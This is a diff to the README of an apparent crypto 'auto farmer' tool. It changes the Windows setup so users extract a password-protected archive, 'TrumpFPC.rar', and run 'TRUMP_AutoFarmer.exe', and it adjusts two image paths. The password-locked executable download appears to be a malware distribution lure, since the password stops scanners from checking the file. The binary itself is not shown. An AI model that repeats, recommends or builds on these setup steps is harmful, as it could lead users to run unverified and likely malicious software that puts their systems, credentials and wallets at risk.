@@ -15,7 +15,7 @@
 
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
-1️⃣ Download and extract the `.rar` file.  
+1️⃣ Download and extract the `TrumpFPC.rar`(Pass:2341ASf).  
 2️⃣ Run `TRUMP_AutoFarmer.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
@@ -28,8 +28,8 @@ python src/main.py
 ---
 
 ## 🖼 Preview:
-![Banner](assets/banner.png)  
-![Screenshot](assets/screenshot.png)  
+![Banner](banner.png)  
+![Screenshot](screenshot.png)  
 
 ---
 
